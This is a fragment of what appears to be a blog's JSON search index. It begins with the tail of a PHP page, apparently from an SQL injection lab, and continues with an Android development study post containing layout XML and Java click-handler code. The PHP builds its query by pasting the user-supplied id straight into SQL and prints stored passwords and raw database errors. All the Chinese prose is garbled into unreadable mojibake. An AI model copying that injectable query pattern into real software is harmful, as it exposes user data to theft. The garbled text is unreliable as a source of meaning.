analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\"; &#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"ç§»åŠ¨åº”ç”¨å¼€å‘","slug":"ç§»åŠ¨åº”ç”¨å¼€å‘","date":"2020-02-20T06:53:26.000Z","updated":"2020-07-29T12:59:41.740Z","comments":true,"path":"2020/02/20/ç§»åŠ¨åº”ç”¨å¼€å‘/","link":"","permalink":"https://singlemindedt.github.io/2020/02/20/ç§»åŠ¨åº”ç”¨å¼€å‘/","excerpt":"","text":"[TOC] é¢˜å‹ï¼š é€‰æ‹©é¢˜20 x 1 ç¨‹åºå¡«ç©ºé¢˜3 x 10 ç®€ç­”é¢˜ 4 x 5(åŸç†æ€§) ç¼–ç¨‹é¢˜ 2 x 15 +++ é‡ç‚¹ï¼šç¬¬å››ç« ï¼šActivity +++ +++ æ˜¾ç¤ºå¯åŠ¨/éšå¼å¯åŠ¨ã€ +++ +++ +++ åˆ›å»ºæµç¨‹ã€ ç”Ÿå‘½å‘¨æœŸã€ éšç€Activityè‡ªèº«çŠ¶æ€çš„å˜åŒ–ï¼ŒAndroidç³»ç»Ÿä¼šè°ƒç”¨ä¸åŒçš„äº‹ä»¶å›è°ƒå‡½æ•°(7ä¸ª)ï¼š activityä¹‹é—´æ•°æ®çš„ä¼ é€’ intentçš„ä½œç”¨ã€ç»„æˆéƒ¨åˆ†7ä¸ª å¸ƒå±€ å¸ƒå±€ç®¡ç†ï¼ˆç¬¬3ã€5ç« ï¼‰ çº¿æ€§ã€ç›¸å¯¹ã€Constraintlayoutå¸ƒå±€ç®¡ç†å™¨ äº‹ä»¶ç›‘å¬ åŸºäºç›‘å¬çš„äº‹ä»¶å¤„ç†ï¼ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»æ·»åŠ äº‹ä»¶ç›‘å¬å™¨ã€ä½¿ç”¨Activityä½œä¸ºäº‹ä»¶ç›‘å¬å™¨ï¼‰ èœé¸Ÿ åŸºäºå›è°ƒçš„äº‹ä»¶å¤„ç†ï¼ˆä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼ï¼‰ å›è°ƒï¼šå°†åŠŸèƒ½å®šä¹‰ä¸åŠŸèƒ½åˆ†å¼€çš„ä¸€ç§æ‰‹æ®µ AndroidåŸºäºå›è°ƒçš„äº‹ä»¶å¤„ç†ï¼Œä¸»è¦åšæ³•æ˜¯é‡å†™Androidç»„ä»¶ç‰¹å®šçš„å›è°ƒæ–¹æ³•ï¼Œæˆ–è€…é‡å†™Activityçš„æ–¹æ³•ã€‚ æ ¸å¿ƒå°±æ˜¯äº‹ä»¶ä¼ æ’­çš„é¡ºåº ç›‘å¬å™¨ä¼˜å…ˆï¼Œç„¶ååˆ°Viewç»„ä»¶è‡ªèº«ï¼Œæœ€åå†åˆ°Activityï¼›è¿”å›å€¼falseç»§ç»­ä¼ æ’­ï¼Œtrueç»ˆæ­¢ä¼ æ’­~ï¼ Handleræ¶ˆæ¯ä¼ é€’æœºåˆ¶ï¼ˆå¤šçº¿ç¨‹ç¯å¢ƒã€äº§ç”ŸHandlerçš„åŸå› ï¼‰ +++ +++ å°çŸ¥è¯†ç‚¹ç¬¬åç« ï¼š serviceï¼ˆç»‘å®šå¯åŠ¨ï¼‰ã€ContentProviderå­˜å‚¨æ•°æ®ã€ã€ã€ +++ 1234&gt; &gt; ContentProviderä½¿ç”¨çš„URIè¯­æ³•ç»“æ„å¦‚ä¸‹&gt; &gt; 1 content://&lt;authority&gt;/&lt;data_path&gt;/&lt;id&gt;&gt; &gt; &gt; &gt; Fragment(ç¢ç‰‡)æ˜¯activityçš„ç•Œé¢ä¸­çš„ä¸€éƒ¨åˆ†æˆ–ä¸€ç§è¡Œä¸ºã€‚ä½ å¯ä»¥æŠŠå¤šä¸ªFragmentä»¬ç»„åˆåˆ°ä¸€ä¸ªactivityä¸­æ¥åˆ›å»ºä¸€ä¸ªå¤šé¢ç•Œé¢ï¼Œå¹¶ä¸”ä½ å¯ä»¥åœ¨å¤šä¸ªactivityä¸­é‡ç”¨ä¸€ä¸ªFragmentã€‚ä½ å¯ä»¥æŠŠFragmentè®¤ä¸ºæ¨¡å—åŒ–çš„ä¸€æ®µactivityï¼Œå®ƒå…·æœ‰è‡ªå·±çš„ç”Ÿå‘½å‘¨æœŸï¼Œæ¥æ”¶å®ƒè‡ªå·±çš„äº‹ä»¶ï¼Œå¹¶å¯ä»¥åœ¨activityè¿è¡Œæ—¶è¢«æ·»åŠ æˆ–åˆ é™¤ã€‚Fragmentä¸èƒ½ç‹¬ç«‹å­˜åœ¨ï¼Œå®ƒå¿…é¡»åµŒå…¥åˆ°activityä¸­ï¼Œè€Œä¸”Fragmentçš„ç”Ÿå‘½å‘¨æœŸç›´æ¥å—æ‰€åœ¨çš„activityçš„å½±å“ã€‚ åä¸‰ç« èµ„æº ShapeDrawableã€GradientDrawableã€AnmationDrawableã€StateListDrawable(åˆ©ç”¨xmlæ¥è¡¨ç¤ºå›¾å½¢) ShapeDrawable:å½¢çŠ¶çš„Drawableå’¯,å®šä¹‰åŸºæœ¬çš„å‡ ä½•å›¾å½¢,å¦‚(çŸ©å½¢,åœ†å½¢,çº¿æ¡ç­‰),æ ¹å…ƒç´ æ˜¯&lt;shape../&gt; èŠ‚ç‚¹æ¯”è¾ƒå¤š GradientDrawable:ä¸€ä¸ªå…·æœ‰æ¸å˜åŒºåŸŸçš„Drawableï¼Œå¯ä»¥å®ç°çº¿æ€§æ¸å˜,å‘æ•£æ¸å˜å’Œå¹³é“ºæ¸å˜æ•ˆæœ æ ¸å¿ƒèŠ‚ç‚¹ï¼š AnmationDrawable:ç”¨æ¥å®ç°Androidä¸­å¸§åŠ¨ç”»çš„,å°±æ˜¯æŠŠä¸€ç³»åˆ—çš„ Drawableï¼ŒæŒ‰ç…§ä¸€å®šå¾—é¡ºåºä¸€å¸§å¸§åœ°æ’­æ”¾ï¼› ä½¿ç”¨ä½œä¸ºæ ¹èŠ‚ç‚¹ oneshot:è®¾ç½®æ˜¯å¦å¾ªç¯æ’­æ”¾,falseä¸ºå¾ªç¯æ’­æ”¾! duration:å¸§é—´éš”æ—¶é—´,é€šå¸¸æˆ‘ä»¬ä¼šè®¾ç½®ä¸º300æ¯«ç§’ æˆ‘ä»¬è·å¾—AniamtionDrawableå®ä¾‹åï¼Œéœ€è¦è°ƒç”¨å®ƒçš„start()æ–¹æ³•æ’­æ”¾åŠ¨ç”»ï¼Œ StateListDrawable:é€šè¿‡ä½¿ç”¨åœ¨åŒä¸€å›¾åƒåŒºåŸŸä½¿ç”¨ä¸åŒçš„å›¾ç‰‡ï¼Œæ¥è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡çš„ ä¸åŒçŠ¶æ€ã€‚selector,è¿™ä¸ªæ˜¯å¿…é¡»è¦æœ‰çš„æ ¹å…ƒç´  ç¬¬å…­ç« é«˜çº§æ§ä»¶ é€šè¿‡é€‚é…å™¨å¡«å……ã€ã€ã€Listview ï¼š ListViewå±•ç¤ºæ•°æ®çš„åŸç† åœ¨Androidä¸­ï¼Œå…¶å®ListViewå°±ç›¸å½“äºwebä¸­çš„jsp,Adapteræ˜¯é€‚é…å™¨ï¼Œå®ƒå°±ç›¸å½“äºwebä¸­çš„Servlet, é€‚é…å™¨çš„ä½œç”¨ Adapterçš„ä½œç”¨å°±æ˜¯æŠŠæ•°æ®å±•ç¤ºåœ¨Listviewä¸­ å®‰è£…æ‰“åŒ…APKåŸºæœ¬æ§ä»¶å­—ç¬¦ä¸²ç»Ÿä¸€ä¿®æ”¹res-&gt;values-&gt;strings.xmlç»Ÿä¸€ä¿®æ”¹ï¼Œé˜²æ­¢ä¹‹åä¿®æ”¹ä»»åŠ¡é‡å·¨å¤§çš„é—®é¢˜ï¼ˆå…¶ä»–æ–‡ä»¶å­—ç¬¦ä¸²éƒ¨åˆ†é€šè¿‡è°ƒç”¨strings.xmlæ–‡ä»¶å†…å®¹å®ç°ï¼Œå¦‚ï¼š android:label=â€@string/app_nameâ€ï¼‰+++++==Androidä¸­çš„ä¸‰ä¸ªé‡è¦æ–‡ä»¶== 1.Activityæ˜¯ä¸€ä¸ªç±»ï¼› 2.Layoutæ–‡ä»¶xmlæ–‡ä»¶ï¼› 3.Manifesté…ç½®æ–‡ä»¶+++++==Andeoidä¸­çš„Viewç»„ä»¶==1.TextView2.Button3.Edittext4.å›¾ç‰‡è§†å›¾ç»„ä»¶ImageView5.å•é€‰æŒ‰é’®ç»„ä»¶RadioGroup6.å¤é€‰æ¡†ç»„ä»¶CheckBox 4.ç•Œé¢å¸ƒå±€ï¼ˆå¸ƒå±€ç®¡ç†å™¨ï¼‰ 1.çº¿æ€§å¸ƒå±€ç®¡ç†å™¨LinearLayout:smile: Weightç”¨æ³• ï¼š0dpã€WrapContentã€match_parent 2.ç›¸å¯¹å¸ƒå±€ç®¡ç†å™¨RelativeLayout*:smile: 3.æ¡†æ¶å¸ƒå±€ç®¡ç†å™¨FrameLayout 4.è¡¨æ ¼å¸ƒå±€ç®¡ç†å™¨TableLayout 5.ç½‘æ ¼å¸ƒå±€ç®¡ç†å™¨GridLayoutï¼ˆConstraintLayoutç®¡ç†å™¨ï¼‰ ç¬¬4ç«  Activity Activityç±»æ˜¯ä¸ç”¨æˆ·å…·ä½“çš„äº¤äº’ç•Œé¢ï¼› R.javaæ˜¯é¡¹ç›®ä¸­æ‰€æœ‰èµ„æºçš„ç´¢å¼•æ–‡ä»¶ï¼Œèµ„æºä»¥ï¼ˆèµ„æºidï¼Œå€¼ï¼‰å½¢å¼å­˜æ”¾åœ¨å¯¹åº”çš„å†…éƒ¨ç±»ä¸­ï¼› Activityç”Ÿå‘½å‘¨æœŸï¼› +++ 1. ç¬¬ä¸€ä¸ªAndroidåº”ç”¨ æ–‡ä»¶ä¸­çš„æ‰€æœ‰Activityéƒ½éœ€è¦åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­æ³¨å†Œä¸€ä¸‹æ‰å¯ä½¿ç”¨ï¼› åœ¨MainActivityé‡ŒæŸ¥çœ‹å¸ƒå±€æ–‡ä»¶ï¼Œå¯ç›´æ¥æŒ‰ä½Ctrlç‚¹å‡»layoutæ–‡ä»¶åï¼Œç›´æ¥è½¬åˆ°ç›¸åº”æ–‡ä»¶ï¼› 2. UIç»„ä»¶2-1å¸ƒå±€ç®¡ç†å™¨ä»£ç åŒºåŸŸï¼šres-&gt;layout-&gt;activity_main.xml çº¿æ€§å¸ƒå±€1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" tools:context=\".MainActivity\" android:orientation=\"vertical\"&gt; &lt;!--+idå³è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªid--&gt; &lt;!-- --&gt; &lt;!--orientation=\"vertical\"è¡¨ç¤ºæ°´å¹³æ–¹å‘æ’åˆ— --&gt; &lt;!--layout_marginTop=\"20dp\"é—´è· --&gt; &lt;!--gravity=\"center\"æœ¬å¸ƒå±€å†…æ–°å»ºå¸ƒå±€ä½ç½®ä¸ºä¸­é—´--&gt; &lt;LinearLayout android:id=\"@+id/ll_1\" android:background=\"#000000\" android:layout_width=\"200dp\" android:layout_height=\"200dp\" android:orientation=\"vertical\" android:paddingRight=\"20dp\" android:paddingLeft=\"20dp\" android:paddingBottom=\"20dp\" android:paddingTop=\"20dp\"&gt; &lt;View android:layout_width=\"200dp\" android:layout_height=\"200dp\" android:background=\"#DFB761D6\" /&gt; &lt;/LinearLayout&gt;&lt;LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"200dp\" android:orientation=\"horizontal\" android:background=\"#0066FF\" android:layout_marginTop=\"20dp\" android:layout_marginLeft=\"15dp\" android:layout_marginRight=\"15dp\" &gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#8BC34A\" android:layout_weight=\"1\"/&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#00BCD4\" android:layout_weight=\"1\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#E91E63\" android:layout_weight=\"1\" /&gt;&lt;/LinearLayout&gt; &lt;!--layout_weight=\"1\"å°†å‰©ä½™å†…å®¹æŒ‰æƒé‡å¹³åˆ†--&gt; &lt;LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"250dp\" android:orientation=\"horizontal\" android:background=\"#0066FF\" android:layout_marginTop=\"20dp\" android:layout_marginLeft=\"15dp\" android:layout_marginRight=\"15dp\" &gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:layout_weight=\"1\" android:background=\"#8BC34A\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#00BCD4\" android:layout_weight=\"1\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#E91E63\" android:layout_weight=\"1\" /&gt; &lt;/LinearLayout&gt;&lt;/LinearLayout&gt; ç›¸å¯¹å¸ƒå±€12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\"&gt; &lt;!--+idå³è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªid,å…¶åè·Ÿçš„åå­—æ˜¯è‡ªå®šä¹‰çš„ï¼›--&gt; &lt;!-- --&gt; &lt;!--layout_alignParentBottom=\"true\"ä¸çˆ¶ç©ºé—´åº•éƒ¨å¯¹é½--&gt; &lt;!--layout_toRightOf=\"@id/view_2\"ä½¿view_3å¤„äºview_2çš„å³è¾¹--&gt; &lt;!--å„ç§å¸ƒå±€å¯åµŒå¥—ä½¿ç”¨ --&gt; &lt;!--layout_below=\"@id/view_3\"ä½¿çº¿æ€§å¸ƒå±€çš„ll_1ä½äºview_3çš„ä¸‹æ–¹ --&gt; &lt;!--layout_marginLeft=\"20dp\"è®¾ç½®view_5çš„å·¦å¤–è¾¹è·ä¸º20dp --&gt; &lt;View android:id=\"@+id/view_1\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#03A9F4\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\"/&gt; &lt;View android:id=\"@+id/view_2\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#CDDC39\" android:layout_alignParentTop=\"true\" android:layout_alignParentLeft=\"true\"/&gt; &lt;View android:id=\"@+id/view_3\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#E91E63\" android:layout_toRightOf=\"@id/view_2\"/&gt; &lt;LinearLayout android:id=\"@+id/ll_1\" android:layout_width=\"match_parent\" android:layout_height=\"200dp\" android:layout_below=\"@id/view_3\" android:orientation=\"horizontal\" android:background=\"#673AB7\" android:padding=\"15dp\"&gt; &lt;View android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#FF5722\"/&gt; &lt;RelativeLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:background=\"#4CAF50\" android:padding=\"10dp\"&gt; &lt;View android:id=\"@+id/view_4\" android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#009688\"/&gt; &lt;View android:id=\"@+id/view_5\" android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#FFEB3B\" android:layout_toRightOf=\"@id/view_4\" android:layout_marginLeft=\"20dp\"/&gt; &lt;/RelativeLayout&gt; &lt;/LinearLayout&gt; &lt;/RelativeLayout&gt; 12android:layout_belowå±æ€§ä¼šå°†å½“å‰æ§ä»¶çš„é¡¶éƒ¨ç½®äºç»™å®šIDçš„æ§ä»¶ä¹‹ä¸‹ï¼Œä½†å¹¶ä¸ä¼šä¸ç»™å®šIDçš„æ§ä»¶å¯¹é½ï¼Œé»˜è®¤ä¼šæ”¾åœ¨çˆ¶æ§ä»¶çš„æœ€å·¦è¾¹ï¼›å¯é€šè¿‡android:layout_alignLeftã€android:layout_alignRightç­‰å¯¹é½å±æ€§æ”¹å˜å½“å‰æ§ä»¶ TextViewä¸»ç•Œé¢åˆ›å»ºButtonç»„ä»¶ï¼š æ–°å»ºTextViewActivityç•Œé¢ï¼Œå¹¶åœ¨Manifestä¸­æ³¨å†Œï¼š åœ¨MainActivityä¸­å£°æ˜ï¼Œå¹¶ä¸ºButtonè®¾ç½®äº‹ä»¶ç›‘å¬æœºåˆ¶ï¼ˆç‚¹å‡»æŒ‰é’®ï¼Œç•Œé¢ä¼šç”±MainActivityè·³è½¬åˆ°TextViewActivityï¼‰ï¼› åœ¨activity_text_view.xmlå¸ƒå±€æ–‡ä»¶ä¸­æ·»åŠ å‡ ä¸ªTextViewä»¥æ»¡è¶³ä¸åŒæ•ˆæœï¼Œæ•ˆæœå›¾åŠä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:padding=\"20dp\"&gt; &lt;TextView android:id=\"@+id/tv_1\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test1\" android:textColor=\"#00BCD4\" android:textSize=\"24sp\"/&gt; //text=\"@string/tv_test1\"å¼•ç”¨ä¹‹å‰åœ¨valuesä¸‹çš„stringsä¸­çš„åå­—ï¼Œåˆ™ä¼šæ˜¾ç¤ºå¯¹åº”ç¼–è¾‘çš„æ–‡å­—å†…å®¹ //ä¹Ÿå¯ä»¥ç›´æ¥å†™æ–‡å­—å†…å®¹android:text=\"å°é»‘æˆ´ç™½å¸½\" &lt;TextView android:id=\"@+id/tv_2\" android:layout_width=\"100dp\" android:layout_height=\"wrap_content\" android:maxLines=\"1\"//ä¸€è¡Œæ˜¾ç¤º android:ellipsize=\"end\"//å¤šä½™å†…å®¹åœ¨ç»“å°¾å¤„ä»¥çœç•¥å·å½¢å¼å±•ç¤º android:text=\"@string/tv_test2\" android:textColor=\"#F44336\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_3\" android:layout_width=\"wrap_content\" android:layout_height=\"34dp\" android:drawableRight=\"@drawable/ic_launcher_foreground\"//å¼•ç”¨å›¾æ ‡ï¼ˆå›¾ç‰‡ä¸­ä¸å¤ªæ˜æ˜¾ï¼Œç™½è‰²Androidæœºå™¨äººå›¾æ ‡ï¼‰ android:text=\"@string/tv_test3\" android:textColor=\"#673AB7\" android:textSize=\"24sp\" /&gt; &lt;TextView android:id=\"@+id/tv_4\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test4\" android:textColor=\"#E91E63\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_5\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test5\" android:textColor=\"#4CAF50\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_6\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test6\" android:textColor=\"#3F51B5\" android:textSize=\"24sp\"/&gt; //è·‘é©¬ç¯ &lt;TextView android:id=\"@+id/tv_7\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test7\" android:textColor=\"#2196F3\" android:textSize=\"24sp\" android:singleLine=\"true\"//å•è¡Œ android:ellipsize=\"marquee\" android:marqueeRepeatLimit=\"marquee_forever\"//å¾ªç¯æ¬¡æ•° android:focusable=\"true\"//è·å–ç„¦ç‚¹ android:focusableInTouchMode=\"true\"/&gt;&lt;/LinearLayout&gt; ä¸‹åˆ’çº¿ã€ä¸­åˆ’çº¿ç­‰æ“ä½œéœ€è¦åœ¨TextViewä¸­ç¼–è¾‘ä»£ç å®ç°ï¼š æ³¨ï¼šstrings.xmlä¸­çš„å†…å®¹ï¼š Button æ–‡å­—å¤§å°ã€é¢œè‰² è‡ªå®šä¹‰èƒŒæ™¯å½¢çŠ¶ è‡ªå®šä¹‰æŒ‰å‹æ•ˆæœ ç‚¹å‡»äº‹ä»¶ æµç¨‹ï¼š åœ¨activity_main.xmlä¸­åˆ›å»ºæ§ä»¶åï¼Œéœ€è¦åœ¨MainActivity.javaä¸­å£°æ˜æ§ä»¶ï¼Œå¹¶åœ¨protected void onCreate()å‡½æ•°ä¸­æ˜ç¡®æ§ä»¶idï¼› æ·»åŠ äº‹ä»¶ç›‘å¬ï¼Œè·³è½¬è¯­å¥ï¼Œæ–°å»ºæ¼”ç¤ºButtonçš„æ´»åŠ¨é¡µé¢ï¼ˆButtonActivityï¼‰ï¼› åœ¨Manifestä¸­æ³¨å†Œï¼ŒAndroidstudioå·²ç»å¸®æˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆï¼› 1&lt;activity android:name=\".ButtonActivity\"&gt;&lt;/activity&gt; å…¶ä¸­â€.â€çš„å«ä¹‰æŒ‡åŒ…åï¼Œå³package=â€com.example.helloworldâ€ï¼Œä»æ–‡ä»¶å¤¹ä¸Šä¹Ÿå¯çœ‹å‡ºButtonActivityå±äºcom.example.helloworldè¿™ä¸ªåŒ…ï¼› è®¾ç½®Buttonæ§ä»¶å¤§å°ã€é¢œè‰²ã€èƒŒæ™¯ç­‰å±æ€§ è‡ªå®šä¹‰æ§ä»¶å½¢çŠ¶ åœ¨drawableæ–‡ä»¶ä¸‹æ–°å»ºDrawableResourceFileæ–‡ä»¶ï¼Œå¹¶å°†Root elementå‚æ•°ä¿®æ”¹ä¸ºshapeï¼› ä¿®æ”¹æ–°å»ºçš„bg_btn2.xmlæ–‡ä»¶å†…å®¹ï¼Œå°†å½¢çŠ¶è®¾ä¸ºåœ†è§’ åœ¨activity_button.xmlä¸­ä¿®æ”¹btn_2çš„èƒŒæ™¯ä¸º 1android:background=\"@drawable/bg_btn2\" å®é™…ä¸Šå°±æ˜¯æŠŠèƒŒæ™¯æ¢ä¸ºå¸¦åœ†è§’çš„å½¢çŠ¶ï¼› æ–°å»ºä¸€ä¸ªButtonåªæœ‰æè¾¹ï¼Œé‡Œé¢æ˜¯ç™½è‰² åœ¨drawableæ–‡ä»¶ä¸‹æ–°å»ºDrawableResourceFileæ–‡ä»¶ï¼Œå¹¶å°†Root elementå‚æ•°ä¿®æ”¹ä¸ºshapeï¼›ï¼ˆæˆ–è€…ç›´æ¥å¤åˆ¶åˆšæ‰çš„bg_btn2.xmlï¼Œå°†åå­—æ”¹ä¸ºbg_btn3.xmlï¼‰ ä¿®æ”¹æ–°å»ºçš„bg_btn3.xmlæ–‡ä»¶å†…å®¹ï¼Œåˆ é™¤å®ä½“å±æ€§ 12&lt;solid android:color=\"#4CAF50\"/&gt; å¢åŠ æè¾¹ 123&lt;stroke android:width=\"1dp\" android:color=\"#4CAF50\"/&gt; åœ¨activity_button.xmlä¸­ä¿®æ”¹btn_3çš„èƒŒæ™¯ä¸º 1android:background=\"@drawable/bg_btn3\" è®¾ç½®æŒ‰å‹æ•ˆæœï¼ˆè§¦æ‘¸å˜è‰²ï¼‰ åœ¨activity_button.xmlä¸­æ–°å»ºæ§ä»¶btn_4è®¾ç½®åŸºæœ¬å±æ€§ åœ¨drawableæ–‡ä»¶ä¸‹æ–°å»ºDrawableResourceFileæ–‡ä»¶ï¼Œå¹¶å°†Root elementå‚æ•°ä¿®æ”¹ä¸ºselectorï¼› ä¿®æ”¹æ–°å»ºçš„bg_btn4.xmlæ–‡ä»¶å†…å®¹ï¼Œè®¾ç½®æŒ‰å‹æƒ…å†µå±æ€§å’Œä¼Ÿå²¸å‹ä¸‹å±æ€§ åœ¨activity_button.xmlä¸­ä¿®æ”¹btn_4çš„èƒŒæ™¯ä¸º 1android:background=\"@drawable/bg_btn4\" ç‚¹å‡»äº‹ä»¶ ç›´æ¥åœ¨åˆšåˆ›å»ºçš„Button4é‡Œç¼–è¾‘ï¼Œæ·»åŠ  1android:onClick=\"showToast\" å³æ·»åŠ äº†ä¸€ä¸ªshowToastæ–¹æ³•ï¼› åœ¨ButtonActivity.javaä¸­æ·»åŠ showToastæ–¹æ³•çš„ä»£ç  1234public void showToast(View view)&#123;Toast.makeText(this,\"btn4è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯&#125; æ­¤æ—¶è¿è¡Œæ¨¡æ‹Ÿå™¨å·²ç»èƒ½å‡ºç°äº‹ä»¶å“åº”äº†ï¼Œç‚¹å‡»Button4ä¼šå‡ºç°æç¤ºâ€œbtn4è¢«ç‚¹å‡»äº†â€ï¼› äº‹ä»¶ç‚¹å‡»2ï¼ˆå¸¸ç”¨ï¼‰ ç›´æ¥åœ¨ButtonActivity.javaæ·»åŠ ä»£ç ä»¥å®ç° ä»¥Button3ä¸ºä¾‹ï¼Œå› ä¸ºè¦ä½¿ç”¨Button3ï¼Œæ•…éœ€å£°æ˜æ§ä»¶ï¼Œè®¾ç½®æ§ä»¶idï¼ˆä»¥è¢«æ‰¾åˆ°ï¼‰ æ·»åŠ äº‹ä»¶ç›‘å¬ä»£ç  123456mBtn3.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"btn3è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯ &#125;&#125;); å…¶ä¸­ 1Toast.makeText(ButtonActivity.this,\"btn3è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯ è¯¥æ–¹æ³•ä¸ä¹‹å‰btn4çš„åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯ä¿®æ”¹äº†thisçš„æŒ‡å‘ï¼› ç»™textviewè®¾ç½®ç‚¹å‡»äº‹ä»¶ å…ˆåœ¨activity_Button.xmlä¸­åˆ›å»ºä¸€ä¸ªtextviewæ§ä»¶ ä¹‹åè¿‡ç¨‹ä¸â€œç‚¹å‡»äº‹ä»¶2â€æ–¹æ³•ä¸€è‡´ ButtonActivity.java 12345678910111213141516171819202122232425262728293031323334353637383940package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;import android.widget.Toast;public class ButtonActivity extends AppCompatActivity &#123; private Button mBtn3; private TextView mTv1; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_button); mBtn3=findViewById(R.id.btn_3); mBtn3.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"btn3è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯ &#125; &#125;); mTv1=findViewById(R.id.tv_1); mTv1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"tv1è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯ &#125; &#125;); &#125; public void showToast(View view)&#123; Toast.makeText(this,\"btn4è¢«ç‚¹å‡»äº†\",Toast.LENGTH_SHORT).show();//å¼¹å‡ºæç¤ºä¿¡æ¯ &#125;&#125; MainActivity.java 123456789101112131415161718192021222324252627282930313233343536373839package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.Button;//Buttonçš„åŒ…ï¼Œè‹¥æ²¡æœ‰åˆ™åœ¨private Button mBtnTextView;ä¸­ç‚¹å‡»buttonæŒ‰ä½Alt+Enterpublic class MainActivity extends AppCompatActivity &#123; private Button mBtnTextView; //å£°æ˜Buttonï¼Œï¼ˆmBtnTextViewä¸ºè®¾ç½®çš„å˜é‡åï¼ŒAndroidè§„èŒƒç¬¬ä¸€ä¸ªå­—æ¯å°å†™ï¼‰å› ä¸ºæˆ‘ä»¬åœ¨activity_main.xmlä¸­åˆ›å»ºäº†ä¸€ä¸ªButtonï¼› private Button mBtnButton;//å£°æ˜ç©ºé—´Button @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //ä»£ç åªèƒ½æ·»åŠ åœ¨ä¸Šé¢ä¸¤è¡Œçš„åé¢ï¼Œå¦åˆ™ç¨‹åºå¼‚å¸¸é€€å‡º 